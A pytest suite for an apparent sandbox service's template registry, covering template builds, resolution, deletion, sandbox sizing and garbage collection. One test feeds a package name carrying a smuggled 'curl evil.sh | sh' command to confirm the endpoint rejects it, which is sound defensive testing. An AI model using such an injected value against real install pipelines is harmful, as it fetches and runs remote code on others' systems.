from __future__ import annotations

from datetime import UTC, timedelta
from typing import TYPE_CHECKING, Any

import httpx
import pytest
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from harborbox import template_builder as builder_module
from harborbox.api import app
from harborbox.config import Settings
from harborbox.db import Base, get_session
from harborbox.models import Sandbox, SandboxTemplate, utc_now
from harborbox.security import require_api_key
from harborbox.templates import (
    TemplateNotReadyError,
    UnknownTemplateError,
    resolve_template,
    validate_template_spec,
)

if TYPE_CHECKING:
    from collections.abc import AsyncIterator

Sessions = async_sessionmaker[AsyncSession]


class FakeTemplateBuilder:
    """Stands in for the Docker-backed builder; records what it was asked to do."""

    def __init__(self) -> None:
        self.scheduled: list[str] = []
        self.removed: list[str] = []

    def schedule_build(self, name: str) -> None:
        self.scheduled.append(name)

    async def remove_image(self, image: str) -> None:
        self.removed.append(image)


@pytest.fixture
async def sessions() -> AsyncIterator[Sessions]:
    engine = create_async_engine("sqlite+aiosqlite://")
    async with engine.begin() as connection:
        await connection.run_sync(Base.metadata.create_all)
    yield async_sessionmaker(engine, expire_on_commit=False)
    await engine.dispose()


@pytest.fixture
async def session(sessions: Sessions) -> AsyncIterator[AsyncSession]:
    async with sessions() as opened:
        yield opened


@pytest.fixture
def builder() -> FakeTemplateBuilder:
    return FakeTemplateBuilder()


@pytest.fixture
async def client(
    sessions: Sessions, builder: FakeTemplateBuilder
) -> AsyncIterator[httpx.AsyncClient]:
    app.state.settings = Settings()
    app.state.template_builder = builder

    async def override_session() -> AsyncIterator[AsyncSession]:
        async with sessions() as opened:
            yield opened

    app.dependency_overrides[get_session] = override_session
    app.dependency_overrides[require_api_key] = lambda: None
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://harborbox"
    ) as opened:
        yield opened
    app.dependency_overrides.clear()


# `overrides` can set any SandboxTemplate column, whose types are
# heterogeneous (str, int, float, dict, ...), so Any is the honest type here.
def derived_row(
    *, apt: list[str] | None = None, **overrides: Any  # noqa: ANN401
) -> SandboxTemplate:
    settings = Settings()
    spec = validate_template_spec(
        settings, base="relaydeck", apt=apt or ["chromium"], npm=[], env={}
    )
    values: dict[str, Any] = {
        "name": spec.name,
        "base": spec.base,
        "spec_hash": spec.spec_hash,
        "spec": spec.as_json(),
        "image": settings.derived_template_image(spec.name),
        "status": "ready",
        "memory_mb": 512,
        "cpu": 1.0,
    }
    values.update(overrides)
    return SandboxTemplate(**values)


async def test_static_templates_resolve_without_touching_the_registry(
    session: AsyncSession,
) -> None:
    resolved = await resolve_template(session, Settings(), "relaydeck")

    assert resolved.image == "harborbox-sandbox-relaydeck:local"
    assert (resolved.memory_mb, resolved.cpu) == (256, 0.5)
    assert resolved.derived is False
    assert resolved.status == "ready"


async def test_derived_templates_resolve_to_their_registry_row(
    session: AsyncSession,
) -> None:
    template = derived_row()
    session.add(template)
    await session.commit()

    resolved = await resolve_template(session, Settings(), template.name)

    assert resolved.derived is True
    assert resolved.base == "relaydeck"
    assert resolved.image == template.image
    # The registry's override wins over the base template's static sizing.
    assert (resolved.memory_mb, resolved.cpu) == (512, 1.0)


async def test_unknown_templates_are_rejected(session: AsyncSession) -> None:
    settings = Settings()

    with pytest.raises(UnknownTemplateError):
        await resolve_template(session, settings, "not-a-template")
    # Well-formed, but never registered.
    with pytest.raises(UnknownTemplateError):
        await resolve_template(session, settings, "relaydeck-a1b2c3d4e5f6")


@pytest.mark.parametrize("status", ["building", "failed"])
async def test_templates_that_are_not_ready_report_their_build_status(
    session: AsyncSession, status: str
) -> None:
    template = derived_row(status=status, error="E: Unable to locate package")
    session.add(template)
    await session.commit()

    with pytest.raises(TemplateNotReadyError) as raised:
        await resolve_template(session, Settings(), template.name)

    assert raised.value.status == status
    assert "Unable to locate package" in str(raised.value)


async def test_creating_a_template_is_idempotent(
    client: httpx.AsyncClient, builder: FakeTemplateBuilder
) -> None:
    payload = {
        "base": "relaydeck",
        "apt": ["chromium", "fonts-liberation"],
        "npm": ["@playwright/mcp@0.0.78"],
        "env": {"PLAYWRIGHT_BROWSERS_PATH": "0"},
    }

    first = await client.post("/v1/templates", json=payload)
    second = await client.post("/v1/templates", json=payload)
    # The same set, reordered and with a duplicate: still the same image.
    third = await client.post(
        "/v1/templates",
        json={**payload, "apt": ["fonts-liberation", "chromium", "chromium"]},
    )

    assert (first.status_code, second.status_code, third.status_code) == (201, 200, 200)
    name = first.json()["name"]
    assert second.json()["name"] == name
    assert third.json()["name"] == name
    assert name == f"relaydeck-{first.json()['spec_hash']}"
    assert first.json()["image"] == f"harborbox-sandbox-{name}:local"
    assert first.json()["status"] == "building"
    assert first.json()["error"] is None
    assert builder.scheduled == [name]


async def test_an_empty_spec_returns_the_base_template_unbuilt(
    client: httpx.AsyncClient, builder: FakeTemplateBuilder
) -> None:
    response = await client.post("/v1/templates", json={"base": "relaydeck"})

    assert response.status_code == 200
    assert response.json()["name"] == "relaydeck"
    assert response.json()["status"] == "ready"
    assert response.json()["image"] == "harborbox-sandbox-relaydeck:local"
    # The base template keeps its warm pool.
    assert response.json()["warm_pool"] == 2
    assert builder.scheduled == []


async def test_a_failed_template_is_rebuilt(
    client: httpx.AsyncClient, session: AsyncSession, builder: FakeTemplateBuilder
) -> None:
    session.add(derived_row(status="failed", error="E: Unable to locate package"))
    await session.commit()

    response = await client.post(
        "/v1/templates", json={"base": "relaydeck", "apt": ["chromium"]}
    )

    assert response.status_code == 201
    assert response.json()["status"] == "building"
    assert response.json()["error"] is None
    assert builder.scheduled == [response.json()["name"]]


async def test_hostile_package_names_are_rejected_by_the_endpoint(
    client: httpx.AsyncClient, builder: FakeTemplateBuilder
) -> None:
    injected = await client.post(
        "/v1/templates",
        json={"base": "relaydeck", "apt": ["chromium; curl evil.sh | sh"]},
    )
    unlisted = await client.post(
        "/v1/templates", json={"base": "relaydeck", "npm": ["left-pad@1.3.0"]}
    )

    assert injected.status_code == 422
    assert "forbidden character" in injected.json()["detail"]
    assert unlisted.status_code == 422
    assert "not allowlisted" in unlisted.json()["detail"]
    assert builder.scheduled == []


async def test_templates_are_listed_and_fetched(
    client: httpx.AsyncClient, session: AsyncSession
) -> None:
    template = derived_row()
    session.add(template)
    await session.commit()

    listed = await client.get("/v1/templates")
    fetched = await client.get(f"/v1/templates/{template.name}")
    static = await client.get("/v1/templates/relaydeck")
    missing = await client.get("/v1/templates/relaydeck-000000000000")

    assert [item["name"] for item in listed.json()["templates"]] == [
        "onvo-pro",
        "onvo-lite",
        "relaydeck",
        template.name,
    ]
    assert fetched.status_code == 200
    assert fetched.json()["spec_hash"] == template.spec_hash
    assert static.json()["warm_pool"] == 2
    assert missing.status_code == 404


async def test_deleting_a_template_refuses_static_names(
    client: httpx.AsyncClient, session: AsyncSession, builder: FakeTemplateBuilder
) -> None:
    template = derived_row()
    session.add(template)
    await session.commit()

    static = await client.delete("/v1/templates/relaydeck")
    derived = await client.delete(f"/v1/templates/{template.name}")

    assert static.status_code == 409
    assert derived.status_code == 204
    assert builder.removed == [template.image]
    assert (await client.get(f"/v1/templates/{template.name}")).status_code == 404


async def test_creating_a_sandbox_resolves_against_the_registry(
    client: httpx.AsyncClient, session: AsyncSession
) -> None:
    used_before = utc_now() - timedelta(days=1)
    template = derived_row(last_used_at=used_before)
    session.add(template)
    await session.commit()

    created = await client.post("/v1/sandboxes", json={"template": template.name})
    unknown = await client.post(
        "/v1/sandboxes", json={"template": "relaydeck-000000000000"}
    )

    assert created.status_code == 201
    assert created.json()["memory_mb"] == 512
    assert created.json()["cpu"] == 1.0
    assert created.json()["metadata"]["template"] == template.name
    assert created.json()["metadata"]["template_base"] == "relaydeck"
    assert created.json()["metadata"]["template_spec_hash"] == template.spec_hash
    assert unknown.status_code == 422

    await session.refresh(template)
    # SQLite drops the offset on read-back; production runs on PostgreSQL.
    assert template.last_used_at.replace(tzinfo=UTC) > used_before


async def test_request_sizing_wins_over_the_shared_template_row(
    client: httpx.AsyncClient, session: AsyncSession
) -> None:
    # Two teams with the same package set share one row, so its memory_mb is
    # last-writer-wins and is only ever a default hint.
    template = derived_row(memory_mb=512, cpu=1.0)
    session.add(template)
    await session.commit()

    explicit = await client.post(
        "/v1/sandboxes",
        json={"template": template.name, "memory_mb": 1024, "cpu": 2.0},
    )
    defaulted = await client.post("/v1/sandboxes", json={"template": template.name})

    assert (explicit.json()["memory_mb"], explicit.json()["cpu"]) == (1024, 2.0)
    assert (defaulted.json()["memory_mb"], defaulted.json()["cpu"]) == (512, 1.0)


async def test_creating_a_sandbox_on_an_unbuilt_template_conflicts(
    client: httpx.AsyncClient, session: AsyncSession
) -> None:
    template = derived_row(status="building")
    session.add(template)
    await session.commit()

    response = await client.post("/v1/sandboxes", json={"template": template.name})

    assert response.status_code == 409
    assert "building" in response.json()["detail"]


def test_a_failed_build_records_the_log_tail_not_a_traceback() -> None:
    # Real BuildKit output for a package that does not resolve.
    output = "\n".join(
        [
            "#4 [1/2] FROM docker.io/library/harborbox-sandbox-relaydeck:local",
            "#4 CACHED",
            "",
            "#5 [2/2] RUN apt-get install -y nosuchpackage-xyz",
            "#5 0.113 E: Unable to locate package nosuchpackage-xyz",
            "#5 ERROR: process did not complete successfully: exit code: 100",
            "ERROR: failed to build: failed to solve: exit code: 100",
        ]
    )

    tail = builder_module.build_log_tail(output)

    assert "E: Unable to locate package nosuchpackage-xyz" in tail
    assert "Traceback" not in tail
    assert "" not in tail.splitlines()
    assert len(tail) <= builder_module.MAX_ERROR_LENGTH


def test_a_build_log_tail_is_bounded_and_never_empty() -> None:
    assert builder_module.build_log_tail("") == (
        "the image build failed without producing any output"
    )
    assert (
        len(
            builder_module.build_log_tail(
                "\n".join(f"line {index}" for index in range(500))
            ).splitlines()
        )
        == builder_module.BUILD_LOG_TAIL_LINES
    )
    assert len(builder_module.build_log_tail("x" * 50_000)) <= (
        builder_module.MAX_ERROR_LENGTH
    )


def test_a_missing_docker_cli_is_reported_as_a_build_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def missing(*args: object, **kwargs: object) -> None:
        raise FileNotFoundError(2, "No such file or directory", "docker")

    monkeypatch.setattr(builder_module.subprocess, "run", missing)
    builder = builder_module.TemplateBuilder(Settings())

    with pytest.raises(builder_module.TemplateBuildError, match="docker CLI"):
        builder._build_sync("FROM scratch\n", "image:local")


async def test_a_build_interrupted_by_a_restart_becomes_rebuildable(
    sessions: Sessions, monkeypatch: pytest.MonkeyPatch
) -> None:
    from harborbox import scheduler as scheduler_module

    template = derived_row(status="building")
    async with sessions() as session:
        session.add(template)
        await session.commit()

    monkeypatch.setattr(scheduler_module, "session_factory", sessions)
    scheduler = scheduler_module.Scheduler(Settings(), object())  # type: ignore[arg-type]
    await scheduler._recover_interrupted_jobs()

    async with sessions() as session:
        recovered = await session.get(SandboxTemplate, template.name)
    assert recovered is not None
    assert recovered.status == "failed"
    assert "control plane restarted" in (recovered.error or "")


async def test_garbage_collection_spares_recent_and_in_use_templates(
    sessions: Sessions, monkeypatch: pytest.MonkeyPatch
) -> None:
    settings = Settings(template_gc_max_idle_days=7)
    stale = utc_now() - timedelta(days=30)
    unused = derived_row(apt=["chromium"], last_used_at=stale)
    in_use = derived_row(apt=["fonts-noto-core"], last_used_at=stale)
    recent = derived_row(apt=["redis-tools"])
    async with sessions() as session:
        session.add_all([unused, in_use, recent])
        session.add(
            Sandbox(
                id="sbx_live",
                status="running",
                agent_token="token",  # noqa: S106 -- placeholder fixture value, not a real credential
                memory_mb=512,
                cpu=1.0,
                pids_limit=128,
                idle_timeout_seconds=0,
                metadata_={"template": in_use.name},
            )
        )
        await session.commit()

    monkeypatch.setattr(builder_module, "session_factory", sessions)
    builder = builder_module.TemplateBuilder(settings)
    removed_images: list[str] = []
    monkeypatch.setattr(builder, "_remove_image_sync", removed_images.append)

    removed = await builder.collect_unused_templates()

    async with sessions() as session:
        remaining = {
            template.name for template in await session.scalars(select(SandboxTemplate))
        }
    assert removed == 1
    assert remaining == {in_use.name, recent.name}
    assert removed_images == [unused.image]
